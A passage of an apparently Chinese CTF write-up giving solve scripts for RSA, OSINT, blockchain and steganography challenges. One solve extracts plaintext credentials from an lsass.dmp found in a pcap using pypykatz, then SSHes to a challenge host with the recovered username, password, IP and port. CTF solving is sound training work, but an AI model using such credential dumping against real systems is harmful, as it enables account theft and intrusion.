+n=20825489698123139427312358235813908831188122629431837435213939197307901251678987909266109959310844471468714237308180487290333889068491106503430156516177566599988193609000565728122172493368572776286199729640176084529179529033159071165889815084949956152007234471933649343743634072356673587613258974082953565848240177717357720918379799092214471736935314356967352460495832597042553425146329955254971272296130376832214081900624023878189763660242551943370962708281677737787426223857022204965043738543727228525935167205033424509100484602367650848918269719924270083733713912562266880394295051276242510789648948740514338324777
+c=17660292517001448415667382933294147092092405515035599241974878300112871854442062464511060994610735354900137641722708614729686565533897576482184144279181475147778387677176348272271380462469442504169069741393441249336244403644195456048895432327953609790997136317418079743539554372864800226725666330693057526593982562626092666413078781481473963123259351557468951203872280649962451021987453492400869965374621346616866098360220974826366437663499045468100705032192923936739527164839478419438533067729191594895444595242468993294280095495595676751833319662172716427810323452481625334318690581815970642174149961644882435761028
+leak=3692928803159612385082176945507830185837247431720458675036856767821980549084041505438940558901970003265562780917014304168473747961208711410251658081541741851950617445754508576247765571585451448623373615544180432133708851940192670177786710978705748899533781421711820301844113328851132313516583
+M=0x7cda79f57f60a9b65478052f383ad7dadb714b4f4ac069997c7ff23d34d075fca08fdf20f95fbc5f0a981d65c3a3ee7ff74d769da52e948d6b0270dd736ef61fa99a54f80fb22091b055885dc22b9f17562778dfb2aeac87f51de339f71731d207c0af3244d35129feba028a48402247f4ba1d2b6d0755baff6
+PR.<x> = PolynomialRing(Zmod(n))
+f=x*M+leak
+f.monic().small_roots(X=2^53,beta=0.44)
+p=6960192004016795*M+leak
+q=n//p
+assert p*q==n
+d=inverse(65537,(p-1)*(q-1))
+long_to_bytes(ZZ(pow(c,d,n)))
+```
+
+# Misc
+
+## Oversharing
+
+pcap data 发现 smb sharing 的 lsass.dmp 文件
+
+pypykatz 分析后得到明文密码和用户名
+
+1a05cf83-e450-4fbf-a2a8-b9fd2bd37d4e
+
+randark
+
+ssh randark@1.13.101.243 -p25771
+
+链接上去后直接 cat flag 即可
+
+## FindMe
+
+我的朋友WearyMeadow几天前在Reddit发了一条动态，他认为没有人能破解他的消息，真的吗？ My friend WearyMeadow posted a Reddit post a few days ago and he doesn't think anyone can decrypt his message. Really?
+
+https://wearymeadow.icu/about/
+
+存在一个被加密的推文 根据生成时间判断相似 以及文章标题和 reddit 一致，密码是P@sSW0rD123$%^
+
+https://www.reddit.com/user/WearyMeadow/comments/15u7773/hello/ --> aHR0cHM6Ly91ZmlsZS5pby82NzB1bnN6cA== -->
+
+https://ufile.io/670unszp
+
+解出来 message.pcap 文件 流量分析基本情况是 存在一个 tcp 聊天 并且 secretkey 是 mysecretkey (?)
+
+```Python
+import random
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+from Crypto.Util.number import long_to_bytes
+
+def decrypt(message, key, seed):
+    random.seed(seed)
+    encrypted_msg = message
+    cipher = AES.new(key, AES.MODE_ECB)
+    decrypted_msg = cipher.decrypt(pad(encrypted_msg))
+    decrypted = b''
+    for i in range(len(decrypted_msg)):
+        decrypted += bytes([decrypted_msg[i] ^ random.randint(0, 255)])
+    return decrypted
+
+encrypted_hex = "778f6cc13090c6a4f0b51939d784a6b38512f80a92b82bf8225fb8bfed713b2f8eee53dfbe228c7296449d904467a1677c83b9534e2dfcfcbc6f7b08f77f96f2"
+encrypted = long_to_bytes(int(encrypted_hex, 16))
+print(encrypted)
+
+for seed in range(12345):
+    decrypted_int = int(decrypt(encrypted, pad(b"mysecretkey"), seed).hex(), 16)
+    if b'CTF{' in long_to_bytes(decrypted_int) or b'ctf{' in long_to_bytes(decrypted_int):
+        print(seed, long_to_bytes(decrypted_int))
+        break
+```
+
+## Fantastic_terminal
+
+![img](20230821210707921.jpg)
+
+# Blockchain
+
+## babyblock
+
+签到题，根据合约creation交易找到timestamp即可。
+
+```TypeScript
+import { ethers } from "hardhat";
+import { ChallengeWM23__factory, ChallengeWM23 } from "../../typechain";
+import { log, initialize } from "../utils";
+
+async function main() {
+    let tx = "0xcb2d1f40783046b623e39312267ad91ecf40ee338fb1631c2526c96af7f7e3b2";
+    let contractAddress = "0xCe8B517e34f7b5C95Dfc16931fC0eC5E41796327";
+    let [challengeContract, attacker] = await initialize<ChallengeWM23>(ChallengeWM23__factory, undefined, undefined, undefined, contractAddress);
+    
+    let blockHash = (await ethers.provider.getTransaction(tx))?.blockHash;
+    if (blockHash) {
+        let block = await ethers.provider.getBlock(blockHash);
+        let timestamp = block?.timestamp;
+        if (timestamp) {
+            let number = timestamp % 10 +1;
+            let tx = await challengeContract.guessNumber(number);
+            await tx.wait();
+            log(`Is Solved: ${await challengeContract.isSolved()}`);
+        }
+    }
+    
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
+```
+
+# Steg
+
+## EZ_v1deo
+
+使用windows的播放器没办法播放，可以使用其他播放器进行播放即可正常查看视频
+
+![img](20230821210711167.jpg)
+
+这里查看并无异常，然后尝试AVI隐写
+
+![img](20230821210711091.jpg)
+
+avi隐写可以讲信息隐藏在某一帧的图片中，使用ffmpeg转换出每一帧进行查看lsb
+
+```Python
+ffmpeg -i E:\BaiduNetdiskDownload\1\flag.avi -r 30 C:\Users\Ap_os\Desktop\2-4\image-%3d.png
+```
+
+![img](20230821210711409.jpg)
+
+![img](20230821210711397.jpg)
+
+隐写查看
+
+![img](20230821210711450.jpg)
+
+得到w, 应该是WMCTF{},然后将每一帧都进行查看即可
+
+得到字符串进行剔除重复的，然后使用比较多的相同字符即为flag中重复的字符，比如下面的9
+
+![img](20230821210711499.jpg)
+
+## StegLab1
+
+加密脚本
+
+```Python
+from PIL import Image
+import numpy as np
+
+class Solution:
+    def Encrypt(self, img_path, key):
+        key = "1111"
+        img = Image.open(img_path)
+        img_array = np.array(img)
+
+        key_values = [ord(char) for char in key]
+        max_key_length = min(len(key_values), img_array.size)
+
+        flat_img_array = img_array.flatten()
+
+        for i in range(max_key_length):
+            flat_img_array[i] ^= key_values[i]
+
+        encrypted_img_array = flat_img_array.reshape(img_array.shape)
+
+        encrypted_img = Image.fromarray(encrypted_img_array.astype(np.uint8))
+
+        return encrypted_img
+```
+
+写解密脚本跑出来这个加密的key，系统可以检测得应该就可以点击flag
+
+```Python
+class Solution:
+    def Encrypt(self, img, key) :
+        img = Image.open(img)
+        img_array = np.array(img)
+
+        key_bin = ''.join(format(ord(char), '08b') for char in key)  # Convert key to binary
+
+        key_index = 0  # Track the index of the key bit we're currently hiding
+
+        for i in range(img_array.shape[0]):
+            for j in range(img_array.shape[1]):
+                for k in range(img_array.shape[2]):
+                    if key_index < len(key_bin):
+                        pixel_value = img_array[i, j, k]
+                        new_pixel_value = pixel_value & 0xFE | int(key_bin[key_index])
+                        img_array[i, j, k] = new_pixel_value
+                        key_index += 1
+                    else:
+                        break
+
+        encrypted_img = Image.fromarray(img_array)
+        return encrypted_img
+class Solution:
+    def Decrypt(self,img)-> str:
+        img = Image.open(img)
+        img_array = np.array(img)
+
+        key_bin = ""
+        key_length = 0
+
+        for i in range(img_array.shape[0]):
+            for j in range(img_array.shape[1]):
+                for k in range(img_array.shape[2]):
+                    pixel_value = img_array[i, j, k]
+                    key_bit = pixel_value & 0x01
+                    key_bin += str(key_bit)
+                    key_length += 1
+
+                    if key_length == 80:  # Assuming a maximum key length of 10 characters (8 bits * 10 = 80 bits)
+                        break
+
+                if key_length == 80:
+                    break
+
+            if key_length == 80:
+                break
+
+        key_chars = [chr(int(key_bin[i:i+8], 2)) for i in range(0, len(key_bin), 8)]
+        key = ''.join(key_chars)
+        return key
+```
+
+没有key可以，有了key不行
+
+```Python
+class Solution:
+    def Encrypt(self, img, key):
+        img = Image.open(img)
+        img_array = np.array(img)
+        flat_img_array = img_array.flatten()
+
+        data_binary = ''.join(format(pixel, '08b') for pixel in flat_img_array)
+        key_binary = ''.join(format(ord(char), '08b') for char in key)
+
+        if len(key_binary) < len(data_binary):
+            key_binary += key_binary * ((len(data_binary) // len(key_binary)) + 1)
+        
+        encrypted_data = ''
+        for data_bit, key_bit in zip(data_binary, key_binary):
+            encrypted_bit = str(int(data_bit) ^ int(key_bit))
+            encrypted_data += encrypted_bit
+        
+        encrypted_pixels = [int(encrypted_data[i:i+8], 2) for i in range(0, len(encrypted_data), 8)]
+        encrypted_img_array = np.array(encrypted_pixels, dtype=np.uint8)
+        encrypted_img_array = encrypted_img_array.reshape(img_array.shape)
+        encrypted_img = Image.fromarray(encrypted_img_array)
+        
+        return encrypted_img
+class Solution:
+    def Decrypt(self, img, key):
+        img = Image.open(img)
+        img_array = np.array(img)
+        flat_img_array = img_array.flatten()
+
+        key_binary = ''.join(format(ord(char), '08b') for char in key)
+
+        extracted_data = ''
+        for pixel in flat_img_array:
+            pixel_binary = format(pixel, '08b')
+            extracted_bit = str(int(pixel_binary[-1]) ^ int(key_binary[-1]))
+            extracted_data += extracted_bit
+            key_binary = key_binary[1:] + extracted_bit
+
+        extracted_text = ''.join(chr(int(extracted_data[i:i+8], 2)) for i in range(0, len(extracted_data), 8))
+        
+        return extracted_text
+```
+
+StegLab2-ToJPGAttack 本地测了没什么问题，能够加解密，服务器远程加密成功，解密寄了
+
+GPT:
+
+```Python
+抱歉，我之前的回复没有写完。下面是如何使用PIL、numpy和异或加密将文本信息加密到图像中，并从加密图像中解密文本信息的完整代码：
+from PIL import Image
+import numpy as np
+
+def xor_crypt(data, key):
+    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
+
+def encode_image(img, msg, key):
+    data = np.array(img)
+    encrypted_msg = xor_crypt(msg.encode(), key)
+    if len(encrypted_msg) * 8 > data.size:
+        raise ValueError("Message is too long to encode in image")
+    bin_msg = ''.join([format(i, "08b") for i in encrypted_msg])
+    data = data.flatten()
+    for i in range(len(bin_msg)):
+        data[i] = data[i] & ~1 | int(bin_msg[i])
+    return Image.fromarray(data.reshape(img.size[1], img.size[0], 3))
+
+def decode_image(img, key):
+    data = np.array(img)
+    data = data.flatten()
+    bin_msg = ''.join([str(data[i] & 1) for i in range(data.size)])
+    encrypted_msg = int(bin_msg, 2).to_bytes(len(bin_msg) // 8, 'big')
+    return xor_crypt(encrypted_msg, key).decode()
+
+key = b"mysecretpassword"
+img = Image.open("image.png")
+encoded_img = encode_image(img, "Hello, World!", key)
+encoded_img.save("encoded_image.png")
+img = Image.open("encoded_image.png")
+msg = decode_image(img, key)
+print("Decoded message:", msg)
+
+上面的代码定义了三个函数：xor_crypt、encode_image和decode_image。xor_crypt函数接受一个要加密/解密的数据和一个用于异或加密的密钥作为输入，并返回加密/解密后的数据。encode_image函数接受一个PIL图像对象、一个要加密的文本消息和一个用于异或加密的密钥作为输入，并返回一个加密后的PIL图像对象。decode_image函数接受一个加密的PIL图像对象和一个用于异或解密的密钥作为输入，并返回解密后的文本信息。
+希望这些信息对您有所帮助！如果您有其他问题，请随时告诉我。😊
+```
+
+加密：
+
+```Python
+class Solution:
+    def xor_crypt(self, data, key):
+        return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
+    def Encrypt(self, img, key):
+        # img, msg, key
+        img = Image.open(img)
+        data = np.array(img)
+        msg = key
+        key = b"mysecretpassword"
+
+        encrypted_msg = self.xor_crypt(msg.encode(), key)
+        if len(encrypted_msg) * 8 > data.size:
+            raise ValueError("Message is too long to encode in image")
+        bin_msg = ''.join([format(i, "08b") for i in encrypted_msg])
+        data = data.flatten()
+        for i in range(len(bin_msg)):
+            data[i] = data[i] & ~1 | int(bin_msg[i])
+        return Image.fromarray(data.reshape(img.size[1], img.size[0], 3))
+```
+
+解密：
+
+```Python
+class Solution:
+
+    def xor_crypt(self, data, key):
+        return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
+
+    def Decrypt(self,img)-> str:
+    # def decode_image(img, key):
+        key = b"mysecretpassword"
+        img = Image.open(img)
+        data = np.array(img)
+        data = data.flatten()
+        bin_msg = ''.join([str(data[i] & 1) for i in range(data.size)])
+        encrypted_msg = int(bin_msg, 2).to_bytes(len(bin_msg) // 8, 'big')
+        d = self.xor_crypt(encrypted_msg, key)
+        # print(d[:20])
+        return d.decode()
+```
